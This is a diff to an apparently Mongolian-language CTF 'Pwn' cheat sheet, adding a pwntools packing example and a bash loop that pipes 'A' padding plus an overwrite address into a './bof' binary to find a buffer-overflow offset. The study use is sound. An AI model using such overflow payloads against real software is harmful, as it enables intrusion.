@@ -500,6 +500,14 @@ Pwn
 	* `b *0x000012`     -> тухайн хаяган дээр break хийнэ
 	* `info registers`  -> одоо байгаа register үүдийн утгийг харна
 	* `set $esp=1`	    -> register ийн утгийг өөрчлөнө
+
+* `pwntools`
+	
+	* `pwn.p32(0xcaf3baee)`
+
+* `bof`
+
+	* `for i in {20..28}; do echo $i; python -c "print 'A' * $i + '\xee\xba\xf3\xca'" | ./bof ; done`
 	
 Programming
 --------------------
